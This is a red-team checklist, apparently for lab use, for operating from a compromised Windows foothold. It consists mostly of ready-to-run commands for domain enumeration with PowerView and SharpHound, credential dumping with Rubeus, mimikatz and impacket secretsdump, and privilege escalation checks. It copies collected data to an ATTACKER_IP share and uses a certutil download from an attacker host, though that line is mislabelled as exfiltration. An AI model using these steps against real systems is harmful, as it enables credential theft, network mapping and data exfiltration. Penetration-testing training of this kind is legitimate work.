# Foothold Machine — Operations

Concise operational checklist for acting from a compromised Windows host (foothold) in a lab: enumeration, data collection, privilege escalation checks, safe persistence patterns, and exfil of collectors.

---

## Quick checklist

- [ ] Initial host recon (whoami, ipconfig, systeminfo)
- [ ] Domain-aware enumeration (PowerView/PowerShell)
- [ ] SharpHound collection (create collector zip)
- [ ] Credential harvesting (klist, Rubeus dump, mimikatz if SYSTEM)
- [ ] Local privilege escalation checks (services, scheduled tasks, ACLs)
- [ ] Exfil collector zip to attacker SMB/HTTP
- [ ] Cleanup (remove binaries, artifacts) per lab rules

---

## Initial host enumeration

```powershell
whoami /all
ipconfig /all
systeminfo
net user
net localgroup
nltest /dsgetdc:DOMAIN

# If PowerView available:
Import-Module .\PowerView.ps1
Get-NetUser -Domain DOMAIN | Out-File users.txt
Get-NetGroup -Domain DOMAIN | Out-File groups.txt
Get-NetComputer -Domain DOMAIN | Out-File comps.txt
Get-NetDomain
Get-NetForest
```

---

## BloodHound collection

```powershell
# run as current user
.\SharpHound.exe -c All
# copy resulting zip(s) to attacker (via SMB)
Copy-Item .\CollectionName.zip \\ATTACKER_IP\share\SharpHound\
```

Notes:

- Use only the collector binary that matches your BloodHound server version.
- If unable to run C# binary, use `bloodhound-python`.

---

## Credential harvesting

- `klist` - list Kerberos tickets
- `Rubeus.exe dump` - dump tickets to files
- `mimikatz` - `sekurlsa::logonpasswords` when you have SYSTEM

Remote secretsdump from attacker (if you have the right privileges):

```bash
python3 /usr/share/impacket/examples/secretsdump.py DOMAIN/ADMIN:Pass@FOOTHOLD_IP
```

---

## Privilege escalation checks

- Check service permissions and unquoted service paths
- List scheduled tasks: `schtasks /query /fo LIST /v`
- Look for writable directories on service accounts
- Run winPEAS (if allowed) for automated checks

---

## Exfil & housekeeping

- Exfil collector zips via SMB: `Copy-Item` or via HTTP `certutil -urlcache -split -f http://ATTACKER/file.zip file.zip`
- Remove tools: `Remove-Item .\SharpHound.exe`, `Remove-Item .\mimikatz.exe`
- Create `postop.log` in `C:\Users\<user>\Desktop\` with timestamps, commands, and collected artifacts list

---
